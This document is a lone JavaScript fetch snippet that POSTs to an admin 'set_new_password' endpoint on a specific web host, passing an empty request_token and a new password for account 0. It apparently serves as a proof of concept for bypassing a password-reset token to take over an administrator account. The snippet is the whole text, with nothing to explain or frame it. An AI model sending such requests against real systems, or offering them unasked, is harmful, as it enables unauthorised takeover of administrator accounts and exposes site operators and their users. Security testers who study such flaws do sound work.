fetch("https://local.meetsoci.com/api/admin/0/set_new_password?request_token=", {
  method: "POST",
  headers: {
    "Content-Type": "application/x-www-form-urlencoded"
  },
  body: "password=PasswordTest123!"
});
